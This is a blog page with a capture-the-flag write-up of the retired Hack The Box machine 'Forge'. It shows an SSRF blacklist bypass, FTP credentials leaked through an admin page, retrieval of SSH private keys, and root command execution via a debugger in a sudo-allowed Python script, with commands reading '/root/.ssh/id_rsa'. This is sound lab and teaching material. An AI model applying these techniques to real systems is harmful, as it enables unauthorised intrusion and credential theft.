
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB." />
<meta name="keywords" content="security, boot2root, HTB, SSRF, LFI">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Forge"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2022/01/htb-forge.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-01-21 17:25:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="SSRF"/>
  <meta property="article:tag" content="LFI"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Forge</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-forge">HTB: Forge</h1>
    <p>
      Posted on 21 Jan 2022 in <a href="../../category/security.html">security</a>

        &#8226; 3 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2022.01/forge_card.png" alt="Forge Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/376">Forge</a> publish on
September 11, 2021 by
<a href="https://www.hackthebox.com/home/users/profile/393721">NoobHacker9999</a>.
This box is rated as a medium machine but could be qualified as an easy medium
:). It implies a SSRF and an LFI as well as some Python and a
<a href="https://docs.python.org/3/library/pdb.html">PDB</a>.</p>


<h1>Foothold</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.91 scan initiated Friday Sep 17 04:59:56 2021 as: nmap -sSV -p- -oN notes.md -A 10.129.220.75
Nmap scan report for 10.129.220.75
Host is up (0.013s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
</code></pre></div>

<h2>Website</h2>
<p>The website is a gallery that allow to upload an image either from the
filesystem or from an URL.</p>
<p>We use <a href="https://github.com/xmendez/wfuzz">wfuzz</a> in addition to the
<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">subdomain secList</a>
to discover that the domain admin.forge.htb exist.</p>
<div class="highlight"><pre><span></span><code><span class="err">```</span><span class="n">text</span><span class="w"></span>
<span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">wfuzz</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">sc</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">&quot;HOST:FUZZ.forge.htb&quot;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">forge</span><span class="o">.</span><span class="n">htb</span><span class="w"></span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">__init__</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="w"> </span><span class="n">UserWarning</span><span class="p">:</span><span class="n">Pycurl</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">Openssl</span><span class="o">.</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">correctly</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">fuzzing</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">sites</span><span class="o">.</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">Wfuzz</span><span class="s1">&#39;s documentation for more information.</span>
<span class="o">********************************************************</span><span class="w"></span>
<span class="o">*</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="mf">3.1</span><span class="o">.</span><span class="mi">0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Web</span><span class="w"> </span><span class="n">Fuzzer</span><span class="w">                         </span><span class="o">*</span><span class="w"></span>
<span class="o">********************************************************</span><span class="w"></span>

<span class="n">Target</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">forge</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="w"></span>
<span class="n">Total</span><span class="w"> </span><span class="n">requests</span><span class="p">:</span><span class="w"> </span><span class="mi">4989</span><span class="w"></span>

<span class="o">=====================================================================</span><span class="w"></span>
<span class="n">ID</span><span class="w">           </span><span class="n">Response</span><span class="w">   </span><span class="n">Lines</span><span class="w">    </span><span class="n">Word</span><span class="w">       </span><span class="n">Chars</span><span class="w">       </span><span class="n">Payload</span><span class="w"></span>
<span class="o">=====================================================================</span><span class="w"></span>

<span class="mi">000000024</span><span class="p">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">1</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">4</span><span class="w"> </span><span class="n">W</span><span class="w">        </span><span class="mi">27</span><span class="w"> </span><span class="n">Ch</span><span class="w">       </span><span class="s2">&quot;admin - admin&quot;</span><span class="w"></span>
<span class="err">```</span><span class="w"></span>
</code></pre></div>

<p>We cannot access the admin interface as some IP filtering is in place.
We try to includ the page by uploading it as an image using the URL but it
failes with an error message: "URL contains a blacklisted address!"</p>
<p>We try the same inclusiion by using upper case on the "FORGE" domain and got the
page http://admin.FORGE.htb</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Admin Portal<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/static/css/main.css&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">header</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">nav</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="p">&gt;</span>Portal home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;align-right margin-right&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/announcements&quot;</span><span class="p">&gt;</span>Announcements<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;align-right&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/upload&quot;</span><span class="p">&gt;</span>Upload image<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">header</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome Admins!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<p>We look at the <code>announcements</code> page:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="ni">&amp;lt;</span>url<span class="ni">&amp;gt;</span>.<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</code></pre></div>

<p>We try to load the FTP page using the disclosed credentials
<code>http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/</code>
We got two files <code>user.txt</code> and <code>snap</code>.</p>
<p>We take a look at the <code>.ssh/id_rsa</code> file (worst case scenario it does not
exist) using <code>http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa</code>
and got the RSA private key. We can now connect as <code>user</code> using SSH and grab the
user flag.</p>
<div class="highlight"><pre><span></span><code>└─$ ssh user@forge.htb -i id_rsa
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
user@forge:~$ cat user.txt
4a8aed62cdd2fca87ce185b780ee3e89
</code></pre></div>

<h1>Root</h1>
<p>We look at our privileges (<code>sudo -l</code>) and we see that we can run <code>/usr/bin/python3 /opt/remote-manage.py</code>
as <code>root</code> without password. Looking at the script it is a remote manager script
that will land us a <a href="https://docs.python.org/3/library/pdb.html">PDB</a> if it got
a unrecognized input. So we launch the script, connect to it using another SSH
terminal and <code>nc</code>, then we just input a "q" that will not be recognize and get
a <a href="https://docs.python.org/3/library/pdb.html">PDB</a> in our first shell allowing
us to load the <code>os</code> module and execute system commands as root using
<code>os.system([COMMAND])</code>.</p>
<div class="highlight"><pre><span></span><code>user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:59816
invalid literal for int() with base 10: b&#39;q&#39;
&gt; /opt/remote-manage.py(27)&lt;module&gt;()
-&gt; option = int(clientsock.recv(1024).strip())
(Pdb) --KeyboardInterrupt--
(Pdb) import os
(Pdb) os.system(&#39;id&#39;)
uid=0(root) gid=0(root) groups=0(root)
0
</code></pre></div>

<p>We just grab the root SSH private key and connect on the box as <code>root</code> allowing us
to get the flag.</p>
<div class="highlight"><pre><span></span><code>(Pdb) os.system(&#39;ls /root/.ssh&#39;)
authorized_keys  id_rsa  id_rsa.pub
0
(Pdb) os.system(&#39;cat /root/.ssh/id_rsa&#39;)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/
DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6
i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh
&lt;SNIP&gt;
-----END OPENSSH PRIVATE KEY-----

└─$ ssh forge.htb -l root -i id_rsa_root
root@forge:~# id
uid=0(root) gid=0(root) groups=0(root)
root@forge:~# cat root.txt
5a7c66fcccbc8a380f220f349e6eea95
</code></pre></div>

<h1>Wrapping up</h1>
<p>This box was really easy for a medium one. The root part really easy. I
triggered it by mistake as "q" for quit is an old habit. Once you get the
subdomain the user part just requires to follow the dots. A great medium box for
beginners.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/ssrf.html">SSRF</a>
      <a href="../../tag/lfi.html">LFI</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2022/01/htb-previse.html" title="HTB: Previse">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2022/02/htb-horizontall.html" title="HTB: Horizontall">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>